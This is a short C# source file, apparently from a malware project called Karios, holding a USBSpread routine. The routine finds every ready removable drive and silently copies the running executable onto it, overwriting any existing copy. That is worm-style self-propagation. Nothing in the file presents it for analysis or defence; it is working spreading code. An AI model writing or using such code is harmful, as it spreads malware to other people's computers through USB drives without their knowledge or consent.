using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Karios
{
    class USB
    {
        public static void USBSpread()
        {
            var alldrives = DriveInfo.GetDrives();

            // Gets infomation about drives
            foreach (DriveInfo d in alldrives)
            {
                if (d.DriveType == DriveType.Removable && d.IsReady)
                {
                    //Checks if they are removable, then adds Karios into the USB
                    File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName,
                        d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
                }
            }
        }
    }
}
